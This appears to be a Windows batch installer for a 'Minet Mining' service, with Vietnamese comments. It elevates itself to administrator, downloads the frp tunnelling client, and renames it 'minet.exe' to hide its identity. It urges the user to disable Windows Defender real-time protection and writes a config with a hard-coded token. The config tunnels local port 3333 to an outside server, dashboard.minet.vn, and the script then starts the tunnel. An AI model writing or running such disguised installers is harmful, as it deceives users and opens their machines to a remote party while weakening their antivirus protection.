@echo off
setlocal enabledelayedexpansion

:: 1. Quyen Admin
net session >nul 2>&1
if errorlevel 1 (
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

set "WD=C:\MinetMining"
if not exist "%WD%" mkdir "%WD%"
cd /d "%WD%"

echo.
echo ===== Minet Mining Setup (Direct Download) =====
echo.

:: 2. Nhap Email
set /p EM="Email: "
if "!EM!"=="" exit /b 1

:: 3. Tai file zip tu GitHub bang CURL (Cực kỳ ổn định)
echo [1/3] Dang tai file tu GitHub...
curl -L -o frp.zip https://github.com/fatedier/frp/releases/download/v0.51.3/frp_0.51.3_windows_amd64.zip

:: 4. Giai nen bang TAR (Co san trong Windows)
echo [2/3] Dang giai nen...
tar -xf frp.zip

:: 5. Tim va doi ten file bang lenh CMD thuan tuy (Khong dung PowerShell nua)
echo [3/3] Dang thiet lap file thuc thi...
for /r %%i in (frpc.exe) do (
    copy /y "%%i" "minet.exe" >nul
)

:: Xoa file rac
del /f /q frp.zip >nul
for /d %%d in (frp_*) do rd /s /q "%%d" >nul

:: 6. Kiem tra xem co file chua
if not exist "minet.exe" (
    echo [ERROR] Van deo co file minet.exe! 
    echo Co the Antivirus da xoa no ngay khi vua giai nen. 
    echo Hay tat Real-time Protection cua Windows Defender di!
    pause
    exit /b 1
)

:: 7. Tao config
(
echo [common]
echo server_addr = dashboard.minet.vn
echo server_port = 7000
echo token = minet2024
echo.
echo [mine-!EM!]
echo type = tcp
echo local_ip = 127.0.0.1
echo local_port = 3333
echo remote_port = 0
) > config.ini

echo.
echo [DONE] Da thay file minet.exe! Chuan bi chay...
timeout /t 2 >nul
start minet.exe -c config.ini
pause
